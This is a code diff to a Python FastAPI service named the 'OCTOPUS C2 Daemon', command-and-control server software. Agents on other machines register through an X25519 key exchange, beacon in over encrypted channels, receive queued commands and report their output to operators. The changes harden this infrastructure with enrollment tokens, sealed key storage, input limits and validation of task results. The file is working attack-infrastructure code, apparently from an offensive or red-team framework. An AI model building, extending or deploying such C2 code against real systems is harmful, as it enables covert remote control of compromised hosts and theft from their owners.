@@ -1,18 +1,17 @@
 
-import os
-import sys
-import json
-import uuid
 import base64
+import json
+import os
+import secrets
 import socket
+import sys
 import threading
-from datetime import datetime
-from typing import Dict, Any
+import uuid
+from typing import Any
 
 try:
-    from fastapi import FastAPI, Request, HTTPException
-    from fastapi.responses import JSONResponse
     import uvicorn
+    from fastapi import FastAPI, HTTPException, Request
     FASTAPI_OK = True
 except ImportError:
     FASTAPI_OK = False
@@ -22,25 +21,77 @@ sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspa
 
 from core.c2.crypto_engine import C2CryptoEngine
 from core.c2.db_backend import C2Database
+from core.c2.enrollment import EnrollmentAuthority
 from core.c2.event_store import EventStore
+from core.c2.key_store import KeyStore
 from core.c2.operators import OperatorManager
 
 # ─── Configuration ───────────────────────────────────────
 BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
-DATA_DIR = os.path.join(BASE_DIR, "data")
+DATA_DIR = os.path.abspath(
+    os.environ.get("OCTOPUS_DATA_DIR", os.path.join(BASE_DIR, "data"))
+)
 KEY_DIR  = os.path.join(DATA_DIR, "keys")
 DB_PATH  = os.path.join(DATA_DIR, "c2.db")
-SOCK_FILE = "/tmp/octopus.sock"
+SOCK_FILE = os.environ.get("OCTOPUS_C2_SOCKET", "/tmp/octopus.sock")
+KEYSTORE_PASSPHRASE_FILE = os.path.join(KEY_DIR, "keystore.passphrase")
+ENROLLMENT_KEY_FILE = os.path.join(KEY_DIR, "enrollment.key")
+MAX_REGISTER_BODY = 64 * 1024
+MAX_BEACON_BODY = 1024 * 1024
+MAX_RESULTS_PER_BEACON = 100
+MAX_RESULT_BYTES = 256 * 1024
 
 # Ensure directories exist BEFORE initializing components
 os.makedirs(DATA_DIR, exist_ok=True)
 os.makedirs(KEY_DIR, exist_ok=True)
+os.chmod(DATA_DIR, 0o700)
+os.chmod(KEY_DIR, 0o700)
+
+
+def _load_or_create_keystore_passphrase() -> str:
+    configured = os.environ.get("OCTOPUS_C2_KEY_PASSPHRASE", "")
+    if configured:
+        if len(configured) < 16:
+            raise RuntimeError("OCTOPUS_C2_KEY_PASSPHRASE must be at least 16 characters")
+        return configured
+    if os.path.exists(KEYSTORE_PASSPHRASE_FILE):
+        os.chmod(KEYSTORE_PASSPHRASE_FILE, 0o600)
+        with open(KEYSTORE_PASSPHRASE_FILE, encoding="utf-8") as handle:
+            value = handle.read().strip()
+        if len(value) < 32:
+            raise RuntimeError("invalid local KeyStore passphrase file")
+        return value
+
+    value = secrets.token_urlsafe(48)
+    descriptor = os.open(
+        KEYSTORE_PASSPHRASE_FILE,
+        os.O_WRONLY | os.O_CREAT | os.O_EXCL,
+        0o600,
+    )
+    with os.fdopen(descriptor, "w", encoding="utf-8") as handle:
+        handle.write(value)
+        handle.flush()
+        os.fsync(handle.fileno())
+    return value
 
 # ─── Initialize Components ──────────────────────────────
-crypto = C2CryptoEngine(key_dir=KEY_DIR)
+key_store = KeyStore(key_dir=KEY_DIR)
+_key_passphrase = _load_or_create_keystore_passphrase()
+if key_store.exists():
+    if not key_store.unlock(_key_passphrase):
+        raise RuntimeError("unable to unlock C2 KeyStore")
+else:
+    key_store.generate(_key_passphrase)
+del _key_passphrase
+
+crypto = C2CryptoEngine(
+    key_dir=KEY_DIR,
+    private_key=key_store.get_or_create_x25519_private_key(),
+)
 db = C2Database(db_path=DB_PATH)
 events = EventStore(db_path=DB_PATH)
 operators = OperatorManager(db_path=DB_PATH)
+enrollment = EnrollmentAuthority(ENROLLMENT_KEY_FILE)
 
 if not FASTAPI_OK:
     print("[!] FATAL: fastapi/uvicorn not installed.  pip install fastapi uvicorn")
@@ -54,7 +105,7 @@ app = FastAPI(title="OCTOPUS C2 Daemon", version="11.0", docs_url=None, redoc_ur
 def _on_agent_registered(event):
     """Projection: update agents table from registration event."""
     p = event.payload
-    db.update_agent(
+    db.register_agent(
         agent_id=p["agent_id"],
         hostname=p.get("hostname", "Unknown"),
         os_name=p.get("os", "Unknown"),
@@ -68,15 +119,9 @@ def _on_task_queued(event):
     p = event.payload
     db.queue_task(p["task_id"], p["agent_id"], p["command"])
 
-def _on_task_completed(event):
-    """Projection: update task result."""
-    p = event.payload
-    db.update_task_result(p["task_id"], p.get("output", ""), p.get("error", ""))
-
 # Subscribe handlers
 events.subscribe("agent.registered", _on_agent_registered)
 events.subscribe("task.queued", _on_task_queued)
-events.subscribe("task.completed", _on_task_completed)
 
 
 # ─── Agent-Facing HTTP Endpoints ─────────────────────────
@@ -85,69 +130,122 @@ def _load_agent_crypto(agent_id: str) -> bool:
     """Load crypto state from DB into memory if daemon restarted."""
     if agent_id not in crypto.agent_state:
         state = db.get_agent_crypto(agent_id)
-        if state and "key" in state:
+        if isinstance(state, str):
+            try:
+                state = key_store.unseal_json(state, aad=agent_id.encode("utf-8"))
+            except Exception:
+                return False
+        if isinstance(state, dict) and "key" in state:
             crypto.agent_state[agent_id] = {
                 "key": bytes.fromhex(state["key"]),
                 "rx_seq": state.get("rx_seq", 0),
                 "tx_seq": state.get("tx_seq", 0),
             }
+            if not isinstance(db.get_agent_crypto(agent_id), str):
+                sealed = key_store.seal_json(state, aad=agent_id.encode("utf-8"))
+                db.update_agent_crypto(agent_id, sealed)
             return True
         return False
     return True
 
 
+def _sealed_agent_crypto(agent_id: str) -> str:
+    state = crypto.agent_state[agent_id]
+    return key_store.seal_json(
+        {
+            "key": state["key"].hex(),
+            "rx_seq": state["rx_seq"],
+            "tx_seq": state["tx_seq"],
+        },
+        aad=agent_id.encode("utf-8"),
+    )
+
+
+async def _read_json_limited(request: Request, limit: int) -> dict[str, Any]:
+    content_length = request.headers.get("content-length")
+    if content_length:
+        try:
+            if int(content_length) > limit:
+                raise HTTPException(status_code=413, detail="Request too large")
+        except ValueError as exc:
+            raise HTTPException(status_code=400, detail="Invalid Content-Length") from exc
+    raw = await request.body()
+    if len(raw) > limit:
+        raise HTTPException(status_code=413, detail="Request too large")
+    try:
+        value = json.loads(raw)
+    except (UnicodeDecodeError, json.JSONDecodeError) as exc:
+        raise HTTPException(status_code=400, detail="Invalid JSON") from exc
+    if not isinstance(value, dict):
+        raise HTTPException(status_code=400, detail="JSON object required")
+    return value
+
+
 @app.post("/register")
 async def register_agent(request: Request):
     """X25519 Registration endpoint with HKDF key derivation."""
-    body = await request.json()
+    body = await _read_json_limited(request, MAX_REGISTER_BODY)
     b64_client_pub = body.get("client_pub")
     encrypted_data = body.get("data")
+    enrollment_token = body.get("enrollment_token")
 
-    if not b64_client_pub or not encrypted_data:
+    if not b64_client_pub or not encrypted_data or not enrollment_token:
         raise HTTPException(status_code=400, detail="Missing crypto payload")
 
+    temp_id = f"registration:{uuid.uuid4().hex}"
     try:
-        client_pub_bytes = base64.b64decode(b64_client_pub)
-        shared_key = crypto.derive_shared_key(client_pub_bytes)  # Now uses HKDF
+        client_pub_bytes = base64.b64decode(b64_client_pub, validate=True)
+        if len(client_pub_bytes) != 32:
+            raise ValueError("invalid client key")
+        if not enrollment.consume(str(enrollment_token), db):
+            raise HTTPException(status_code=401, detail="Enrollment denied")
+        shared_key = crypto.derive_shared_key(client_pub_bytes)
 
-        # Temp state for initial decryption
-        crypto.agent_state["temp_id"] = {"key": shared_key, "rx_seq": 0, "tx_seq": 0}
+        crypto.agent_state[temp_id] = {"key": shared_key, "rx_seq": 0, "tx_seq": 0}
 
-        raw_data = crypto.decrypt_aes_gcm("temp_id", encrypted_data)
+        raw_data = crypto.decrypt_aes_gcm(temp_id, encrypted_data)
         data = json.loads(raw_data)
-        real_agent_id = data.get("agent_id")
+        if not isinstance(data, dict):
+            raise ValueError("invalid registration data")
+        real_agent_id = f"AGT-{uuid.uuid4().hex}"
 
-        # Move crypto state to real agent ID
-        crypto.agent_state[real_agent_id] = crypto.agent_state.pop("temp_id")
-
-        # Publish event (state is built from this)
+        crypto.agent_state[real_agent_id] = crypto.agent_state.pop(temp_id)
+        resp_data = {
+            "status": "ok",
+            "agent_id": real_agent_id,
+            "interval": 60,
+            "jitter": 20,
+        }
+        resp_enc = crypto.encrypt_aes_gcm(real_agent_id, json.dumps(resp_data))
+        sealed_state = _sealed_agent_crypto(real_agent_id)
         events.append("agent", real_agent_id, "agent.registered", {
             "agent_id": real_agent_id,
             "hostname": data.get("hostname"),
             "os": data.get("os"),
             "user": data.get("user"),
             "ip": request.client.host,
-            "crypto_state": {
-                "key": shared_key.hex(),
-                "rx_seq": 0,
-                "tx_seq": 0,
-            }
+            "crypto_state": sealed_state,
         })
-
-        resp_data = {"status": "ok", "interval": 60, "jitter": 20}
-        resp_enc = crypto.encrypt_aes_gcm(real_agent_id, json.dumps(resp_data))
+        if db.get_agent_crypto(real_agent_id) != sealed_state:
+            crypto.agent_state.pop(real_agent_id, None)
+            raise RuntimeError("agent projection failed")
         return {"data": resp_enc}
 
-    except Exception as e:
-        crypto.agent_state.pop("temp_id", None)
-        raise HTTPException(status_code=400, detail=str(e))
+    except HTTPException:
+        raise
+    except Exception as exc:
+        raise HTTPException(status_code=400, detail="Registration failed") from exc
+    finally:
+        crypto.agent_state.pop(temp_id, None)
 
 
 @app.post("/beacon")
 async def beacon(request: Request):
     """Beaconing endpoint."""
-    body = await request.json()
+    body = await _read_json_limited(request, MAX_BEACON_BODY)
     encrypted_data = body.get("data")
+    if not isinstance(encrypted_data, str):
+        raise HTTPException(status_code=400, detail="Missing encrypted payload")
 
     agent_id = request.headers.get("Agent-ID")
     if not agent_id or not _load_agent_crypto(agent_id):
@@ -163,31 +261,76 @@ async def beacon(request: Request):
         })
 
         # Sync crypto state to DB
-        state = crypto.agent_state[agent_id]
-        db.update_agent(
+        crypto.agent_state[agent_id]
+        sealed_state = _sealed_agent_crypto(agent_id)
+        if not db.update_agent_seen(
             agent_id=agent_id,
             hostname=decrypted.get("hostname", "Unknown"),
-            os_name="Unknown", user="Unknown",
+            os_name=decrypted.get("os", "Unknown"),
+            user=decrypted.get("user", "Unknown"),
             ip=request.client.host,
-            crypto_state={"key": state["key"].hex(), "rx_seq": state["rx_seq"], "tx_seq": state["tx_seq"]}
-        )
+            crypto_state=sealed_state,
+        ):
+            raise HTTPException(status_code=401, detail="Agent not found")
+
+        acknowledgements = decrypted.get("acks") or []
+        if (
+            not isinstance(acknowledgements, list)
+            or len(acknowledgements) > MAX_RESULTS_PER_BEACON
+            or any(
+                not isinstance(task_id, str) or not task_id or len(task_id) > 64
+                for task_id in acknowledgements
+            )
+        ):
+            raise HTTPException(status_code=400, detail="Invalid task acknowledgements")
+        if acknowledgements:
+            accepted = db.acknowledge_tasks(agent_id, acknowledgements)
+            if accepted != len(set(acknowledgements)):
+                raise HTTPException(status_code=409, detail="One or more acknowledgements were rejected")
 
         # Process results
-        if "results" in decrypted and decrypted["results"]:
-            for res in decrypted["results"]:
+        results = decrypted.get("results") or []
+        if not isinstance(results, list) or len(results) > MAX_RESULTS_PER_BEACON:
+            raise HTTPException(status_code=413, detail="Too many results")
+        if results:
+            rejected = []
+            for res in results:
+                if not isinstance(res, dict):
+                    rejected.append("")
+                    continue
+                task_id = str(res.get("task_id", ""))
+                output = str(res.get("output", ""))
+                error = str(res.get("error", ""))
+                if (
+                    not task_id
+                    or len(task_id) > 64
+                    or len(output.encode("utf-8")) > MAX_RESULT_BYTES
+                    or len(error.encode("utf-8")) > MAX_RESULT_BYTES
+                ):
+                    rejected.append(task_id)
+                    continue
+                if not db.update_task_result(task_id, agent_id, output, error):
+                    rejected.append(task_id)
+                    continue
                 events.append("task", res["task_id"], "task.completed", {
-                    "task_id": res["task_id"],
-                    "output": res.get("output", ""),
-                    "error": res.get("error", ""),
+                    "task_id": task_id,
+                    "agent_id": agent_id,
+                    "status": "error" if error else "completed",
                 })
+            if rejected:
+                raise HTTPException(status_code=409, detail="One or more task results were rejected")
 
         pending = db.get_pending_tasks(agent_id)
 
         resp_data = {"tasks": pending}
         resp_enc = crypto.encrypt_aes_gcm(agent_id, json.dumps(resp_data))
+        if not db.update_agent_crypto(agent_id, _sealed_agent_crypto(agent_id)):
+            raise HTTPException(status_code=401, detail="Agent not found")
         return {"data": resp_enc}
-    except Exception as e:
-        raise HTTPException(status_code=400, detail=str(e))
+    except HTTPException:
+        raise
+    except Exception as exc:
+        raise HTTPException(status_code=400, detail="Invalid beacon") from exc
 
 
 # ─── Operator IPC Control Plane ──────────────────────────
@@ -239,7 +382,7 @@ def handle_client(conn):
                 command = req.get("command")
 
                 if db.get_agent_crypto(agent_id):
-                    task_id = str(uuid.uuid4())[:8]
+                    task_id = uuid.uuid4().hex
 
                     # Publish event (projection handles DB insert)
                     events.append("task", task_id, "task.queued", {
@@ -350,15 +493,23 @@ def main():
     sock_thread = threading.Thread(target=run_socket_server, daemon=True)
     sock_thread.start()
 
-    print("[*] Starting OCTOPUS C2 Daemon v11.0 on 0.0.0.0:8443")
+    host = os.environ.get("OCTOPUS_C2_HOST", "127.0.0.1")
+    try:
+        port = int(os.environ.get("OCTOPUS_C2_PORT", "8443"))
+    except ValueError as exc:
+        raise RuntimeError("OCTOPUS_C2_PORT must be an integer") from exc
+    if not 1 <= port <= 65535:
+        raise RuntimeError("OCTOPUS_C2_PORT is outside the valid range")
+
+    print(f"[*] Starting OCTOPUS C2 Daemon v11.0 on {host}:{port}")
     print(f"[*] Event Store: {DB_PATH}")
     print(f"[*] RBAC: {len(operators.list_operators())} operator(s)")
 
     try:
-        uvicorn.run(app, host="0.0.0.0", port=8443, log_level="warning")
+        uvicorn.run(app, host=host, port=port, log_level="warning")
     except OSError as e:
         if "Address already in use" in str(e):
-            print(f"[!] Port 8443 already in use. Kill existing process or change port.")
+            print(f"[!] Port {port} already in use. Kill existing process or change port.")
         else:
             raise
 
